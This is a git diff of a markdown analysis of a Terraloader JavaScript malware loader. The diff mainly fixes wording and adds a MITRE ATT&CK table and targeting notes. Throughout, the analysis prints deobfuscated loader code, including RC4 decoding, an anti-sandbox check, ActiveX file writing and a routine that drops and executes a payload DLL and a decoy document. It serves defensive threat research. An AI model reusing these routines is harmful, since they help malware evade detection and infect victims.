@@ -1,6 +1,9 @@
 # Analysis of Terraloader sample
 ## Table of Contents
 * [Malware analysis](#Malware-analysis)
+  + [First layer](#first)
+  + [Second layer](#second)
+  + [Additionnal Informations](#infos)
 * [Cyber kill chain](#Cyber-kill-chain)
 * [Indicators Of Compromise (IOC)](#IOC)
 * [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
@@ -10,8 +13,9 @@
   + [Ressources](#Ressources)
 
 <h2>Malware analysis <a name="Malware-analysis"></a></h2>
-<h6>This analysis presents a javascript loader (Terraloader) using many arrays, calculations and variables in memory for make harder the analysis and lowering the detection rate on antivirus. This loader have two stagers.</h6>
-<h6> The first block of the payload is the globals values used for decode the first layer, this give the tab of values as key, the offset, the base of characters and the rest for initialized the variables used for the second stage.</h6>
+<h3>First layer<a name="first"></a></h3>
+<h6>This analysis presents a JavaScript loader (Terraloader) using many arrays, calculations and variables in memory for making harder the analysis and lowering the detection rate on antivirus. This loader has two stagers.</h6>
+<h6>The first block of the payload is the globals values used for decode the first layer, this gives the tab of values as key, the offset, the base of characters and the rest for initialized the variables used for the second stage.</h6>
 
 ```javascript
 var tab = [];
@@ -31,7 +35,7 @@ var blawp23 = "";
 var blawp7 = "";
 ```
 
-<h6>The next block is composed of two functions, the first use a switch case condition to select the character corresponding to its ASCII value, one interesting thing to note is the fact that the default case isn't set, it is automatically created by an IDE , which is more the sign of a generation by a tool.</h6>
+<h6>The next block is composed of two functions. The first use a switch case condition to select the character corresponding to its ASCII value, one interesting thing to note is the fact that the default case isn't set, it is automatically created by an IDE, which is more the sign of a generation by a tool.</h6>
 
 ```javascript
 function get_ascii_value(arg) 
@@ -327,7 +331,7 @@ function get_ascii_value(arg)
  return x;
 }
 ```
-<h6>The second function reconstructs by a series of loops while for build the base of characters used by loader</h6>
+<h6>The second function reconstructs by a series of loops while for building the base of characters used by loader.</h6>
 
 ```javascript
 function get_base() 
@@ -408,7 +412,7 @@ function find_index(tab, search_element)
 }
 ```
 
-<h6>The third block is composed of five functions, the first two give the length of an object and the second to push an element in succession in the chosen array. The third allows to create an ability to search for a element in an array and get the index. </h6>
+<h6>The third block is composed of five functions, the first two give the length of an object and the second to push an element in succession in the chosen array. The third allows to create an ability to search for an element in an array and get the index. </h6>
 
 ```javascript
 function get_length(arg) {return arg.length;}
@@ -422,7 +426,7 @@ function find_index(tab, search_element)
  } while (index < get_length(tab));
 }
 ```
-<h6>The penultimate function give a capacity to compare two array for verity if the sequence of elements in a array is the same, this will be used later in the decryption of payloads. The last allows you to join the elements of an array to a string.</h6>
+<h6>The penultimate function gives a capacity to compare two arrays for verity if the sequence of elements in an array is the same, this will be used later in the decryption of payloads. The last allows you to join the elements of an array to a string.</h6>
 
 ```javascript
 function compare_arrays(tab, tab2) 
@@ -450,7 +454,7 @@ function string_join(arg)
 }
 ```
 
-<h6>The last block of four functions before seeing the main process of the script. The first function is an RC4 decryption for the fisrt decryption process. The second function the ability to decode byte by byte for the second decryption time. The third function is incremented on each return of main algorithm for get the key for the RC4 description, by this fact, this make a fixed value of the loops needed for the main algorithm. The last function launch the process for decrypt all the payloads in the script (exe + doc files).</h6>
+<h6>The last block of four functions before seeing the main process of the script. The first function is RC4 decryption for the first decryption process. The second function the ability to decode byte by byte for the second decryption time. The third function is incremented on each return of the main algorithm for getting the key for the RC4 description, by this fact, this makes a fixed value of the loops needed for the main algorithm. The last function launches the process for decrypt all the payloads in the script (exe + doc files).</h6>
 
 ```javascript
 
@@ -570,7 +574,7 @@ function decode_payload(arg, offset1, offset2)
 }
 ```
 
-<h6>Now, the main algorithm for the main function. Firstly, this used use a do-while loop to generate a sequence of elements if this trigger the same sequence that the reference, this break the loop in changing the value. This is an anti-sandbox and anti-analysis technique.</h6>
+<h6>Now, the main algorithm for the main function. Firstly, this used to use a do-while loop to generate a sequence of elements if this trigger the same sequence that the reference, this breaks the loop in changing the value. This is an anti-sandbox and anti-analysis technique.</h6>
 
 ```javascript 
 function main() 
@@ -639,7 +643,7 @@ function main()
  i = 0;
  offset_tab = lim + index;
  ```
- <h6>By debug, this give the following parameters : </h6>
+ <h6>By debugging, this gives the following parameters :</h6>
  
 |Variable|Value|
 | :-------------: |:-------------:|
@@ -649,7 +653,7 @@ function main()
 |offset|21|
 |tab|[98,72,102,109,106,112,83,117,101,117,65,79,115,68,88,116,104,108,49,57,57]|
  
-<h6>Once this done, this check again for be ensure that the process have been done and launch the second layer</h6>
+<h6>Once this done, this check again for be ensure that the process have been done and launch the second layer.</h6>
 
  ```javascript 
  if (iden_correct === 915) 
@@ -674,14 +678,15 @@ function main()
 main();
 ```
 
-<h6>List of the main objects used for the second layer </h6>
+<h6>List of the main objects used for the second layer : </h6>
 
 |Variable|Role|
 | :-------------: |:-------------:|
-|blawp868|Second layer|
+|blawp868|Second layer payload|
 |blawp7|Decoy document|
 |blawp718|PE file (ocx file)|
 
+<h3>Second layer<a name="second"></a></h3>
 <h6>The second layer use the same decryption functions that the first layer and the globals variables of the first layer like it :</h6>
 
 ```javascript
@@ -690,7 +695,7 @@ tmp_actxobj = actxobj.environment(decode_payload("?@1YW3E[A", blawp15, 21));
 blawp682 = tmp_actxobj(decode_payload("c{+tm06*B", blawp15, 21)) + "\\" + decode_payload("rVVF=+;Msl7", blawp15, 21) + "\\";
 ```  
 
-<h6>In more of the functions of the layer 1, this add five functions. This give the ability to write to a file the data decrypted, get a random number (names of files), get the character and have an ActiveX Object.</h6>
+<h6>In more of the functions of the layer 1, this adds five functions. This gives the ability to write to a file the data decrypted, get a random number (names of files), get the character and have an ActiveX Object.</h6>
 
 ```javascript
 function get_char(arg){return String.fromCharCode(arg);}
@@ -886,7 +891,7 @@ function main()
 }
 ``` 
 
-<h6>Finaly drop the document and dll and execute it.</h6>
+<h6>Finally drop the document and dll and execute it.</h6>
 
 ```javascript
 function exec_pay()
@@ -933,8 +938,8 @@ function exec_pay()
     }
 }
 ``` 
-<h3>Additionnal Informations</h3>
-<h6>In the certificate of the signed js script, several interesting information is present. The RSA public key was randomly generated and did not import directly. The certificate was issued on March 15, 2019 and uses "thawte, Inc." as the organization name.</h6>
+<h3>Additionnal Informations<a name="infos"></a></h3>
+<h6>In the certificate of the signed js script, some interesting informations are present. The RSA public key was randomly generated and did not import directly. The certificate was issued on March 15, 2019, and uses "thawte, Inc." as the organization name.</h6>
 
 ```json
 ProviderType         : PROV_RSA_AES
@@ -963,6 +968,10 @@ IssuerName                                               Hash                   
 ----------                                               ----                                     ------- ------------
 CN=thawte SHA256 Code Signing CA, O="thawte, Inc.", C=US 259e2142575482b958a102aa64129fe7d3f9035a       3 3309fadb8da0ed2efa1e1d691e36022d
 ```
+###### In addition, this is interesting to see that the loader hasn't been the code similarity and some parts have developed by different people, this can be code pick at forums or requested an developed by another person. As example, the code uses all the time ```C i = i + 1``` for increments the index or process, on the RC4 decryption method, this uses the condensed version ```C i += 1``` for all the operations of increments.
+
+<h6>This seems want target the pension fund of First Atlantic Health Care organization, a copy fo the decoy document can be viewed <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/02-01-20/Document.txt">here</a>.</h6>
+
 
 <h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
 <h6>The process graph resume cyber kill chains used by the attacker :</h6>
@@ -982,9 +991,11 @@ CN=thawte SHA256 Code Signing CA, O="thawte, Inc.", C=US 259e2142575482b958a102a
 
 |Enterprise tactics|Technics used|Ref URL|
 | :---------------: |:-------------| :------------- |
-||||
+|Execution|Regsvr32<br>Execution through Module Load|https://attack.mitre.org/techniques/T1117/<br>https://attack.mitre.org/techniques/T1129/|
+|Defense Evasion|Regsvr32<br>Install Root Certificate|https://attack.mitre.org/techniques/T1117/<br>https://attack.mitre.org/techniques/T1130/|
+|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012/|
 
-<h6> This can be exported as JSON format <a href="">Export in JSON</a></h6>
+<h6> This can be exported as JSON format <a href="">Export in JSON</a>https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/02-01-20/Json/MitreAttack.json</h6>
 <h2>Links <a name="Links"></a></h2>
 <h6> Original tweet: </h6><a name="tweet"></a>
 
